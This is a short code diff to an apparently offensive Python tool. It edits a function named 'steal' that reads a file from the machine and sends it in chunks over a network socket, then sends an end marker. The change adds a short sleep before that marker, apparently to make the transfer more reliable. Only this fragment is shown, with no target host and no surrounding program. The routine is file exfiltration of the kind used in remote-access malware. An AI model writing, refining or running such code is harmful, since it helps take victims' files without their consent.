@@ -1,6 +1,7 @@
 from socket import socket, AF_INET, SOCK_STREAM
 from platform import platform
 import subprocess
+from time import sleep
 
 
 def steal(sock, path):
@@ -12,7 +13,7 @@ def steal(sock, path):
 			sock.send(f)
 			f = file.read(1024)
 		file.close()
-
+		sleep(0.2)
 		sock.send("end".encode())
 
 	except:
